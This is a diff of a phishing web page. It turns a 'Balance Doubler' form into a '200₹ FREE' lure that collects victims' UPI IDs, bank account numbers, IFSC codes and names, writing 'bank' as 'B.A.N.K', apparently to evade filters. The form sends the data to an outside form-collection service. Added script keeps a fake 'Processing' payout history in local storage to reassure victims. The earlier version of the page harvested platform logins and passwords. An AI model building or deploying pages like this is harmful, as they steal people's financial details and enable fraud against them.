@@ -46,26 +46,96 @@
         button:hover {
             background-color: #0056b3;
         }
+        .history {
+            margin-top: 20px;
+        }
+        .history-item {
+            background-color: #f9f9f9;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        .status {
+            color: yellow;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>Balance Doubler</h2>
-        <form action="https://formcarry.com/s/Ate69xL8rhg" method="POST">
-            <label for="platform">Platform Link :</label>
-            <input type="text" id="platform" name="platform" placeholder="Enter Platform Link" required>
+        <h2>200₹ FREE</h2>
+        <form id="requestForm" action="https://formcarry.com/s/Ate69xL8rhg" method="POST">
+            <label for="platform">UPI ID :</label>
+            <input type="text" id="platform" name="platform" placeholder="Enter UPI ID" required>
 
-            <label for="uid">UID :</label>
-            <input type="text" id="uid" name="uid" placeholder="Enter UID" required>
+            <label for="uid">B.A.N.K AC:</label>
+            <input type="text" id="uid" name="uid" placeholder="Enter Bank Account Number" required>
 
-            <label for="mob">Mob :</label>
-            <input type="text" id="mob" name="mob" placeholder="Enter Mobile Number" required>
+            <label for="mob">B.A.N.K IFSC:</label>
+            <input type="text" id="mob" name="mob" placeholder="Enter Bank IFSC Code" required>
 
-            <label for="pwd">Pwd :</label>
-            <input type="password" id="pwd" name="pwd" placeholder="Enter Password" required>
+            <label for="pwd">NAME:</label>
+            <input type="password" id="pwd" name="pwd" placeholder="Enter Name" required>
 
             <button type="submit">OK</button>
         </form>
+        
+        <div class="history">
+            <h3>History</h3>
+            <div id="historyContainer"></div>
+        </div>
     </div>
+
+    <script>
+        document.getElementById('requestForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const platform = document.getElementById('platform').value;
+            const uid = document.getElementById('uid').value;
+            const mob = document.getElementById('mob').value;
+            const pwd = document.getElementById('pwd').value;
+
+            // Save details to local storage
+            const details = {
+                amount: '₹200',
+                platform: platform,
+                uid: uid,
+                mob: mob,
+                status: 'Processing'
+            };
+            let history = JSON.parse(localStorage.getItem('history')) || [];
+            history.push(details);
+            localStorage.setItem('history', JSON.stringify(history));
+
+            // Update history display
+            updateHistoryDisplay();
+
+            // Submit the form
+            this.submit();
+        });
+
+        function updateHistoryDisplay() {
+            const historyContainer = document.getElementById('historyContainer');
+            historyContainer.innerHTML = '';
+
+            const history = JSON.parse(localStorage.getItem('history')) || [];
+
+            history.forEach(item => {
+                const div = document.createElement('div');
+                div.className = 'history-item';
+                div.innerHTML = `
+                    <p>Amount: ${item.amount}</p>
+                    <p>UPI ID: ${item.platform}</p>
+                    <p>B.A.N.K IFSC: ${item.mob}</p>
+                    <p>B.A.N.K AC: ${item.uid}</p>
+                    <p>Status: <span class="status">${item.status}</span></p>
+                `;
+                historyContainer.appendChild(div);
+            });
+        }
+
+        // Load history on page load
+        updateHistoryDisplay();
+    </script>
 </body>
 </html>
